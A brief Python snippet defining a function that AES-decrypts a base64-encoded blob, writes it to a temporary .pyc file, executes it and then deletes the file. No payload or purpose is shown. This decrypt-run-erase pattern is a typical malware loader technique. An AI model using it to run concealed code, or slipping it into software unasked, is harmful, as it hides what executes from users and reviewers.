import base64, tempfile, runpy, os
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad

def decrypt_and_run(encoded_data, encoded_key, encoded_iv):
    data = base64.b64decode(encoded_data)
    key = base64.b64decode(encoded_key)
    iv = base64.b64decode(encoded_iv)

    cipher = AES.new(key, AES.MODE_CBC, iv)
    decrypted = unpad(cipher.decrypt(data), AES.block_size)

    with tempfile.NamedTemporaryFile(delete=False, suffix=".pyc") as f:
        f.write(decrypted)
        path = f.name

    runpy.run_path(path)
    os.unlink(path)
